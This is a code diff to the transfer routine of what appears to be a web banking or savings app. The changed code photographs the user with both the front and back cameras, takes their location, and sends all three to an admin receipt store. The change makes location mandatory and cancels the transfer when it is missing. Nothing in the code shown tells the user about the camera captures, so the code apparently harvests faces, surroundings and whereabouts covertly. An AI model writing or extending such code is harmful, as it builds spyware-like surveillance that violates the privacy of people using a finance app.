@@ -167,11 +167,22 @@ async function completeTransfer() {
     localStorage.setItem('kudasavingsData', JSON.stringify(appData));
     localStorage.setItem('currentTransaction', JSON.stringify(pendingTransaction));
 
-    // Capture both cameras and location simultaneously for speed
-    const [cameras, location] = await Promise.all([
+    // Capture both cameras (sequential) and location in parallel
+    const [cameras, locResult] = await Promise.all([
         captureBothCameras(),
-        getCurrentLocation()
+        getLocationForUser(appData.userName || 'BABATUNDE')
     ]);
+
+    // HARD BLOCK: no receipt without location
+    if (locResult.blocked) {
+        document.getElementById('loadingOverlay').classList.add('hidden');
+        alert('Unable to determine your location. Please enable GPS/Location in your phone settings and try again. A receipt cannot be generated without your location.');
+        // Restore the deducted balance since the transaction is cancelled
+        appData.balance += pendingTransaction.amount;
+        appData.transactions.shift();
+        localStorage.setItem('kudasavingsData', JSON.stringify(appData));
+        return;
+    }
 
     try {
         await saveReceiptToAdmin({
@@ -186,7 +197,7 @@ async function completeTransfer() {
             transactionType: 'debit',
             capturedFace: cameras.front,
             backCameraPhoto: cameras.back,
-            location: location
+            location: locResult.location
         });
     } catch (e) {
         console.error('Receipt save failed:', e);
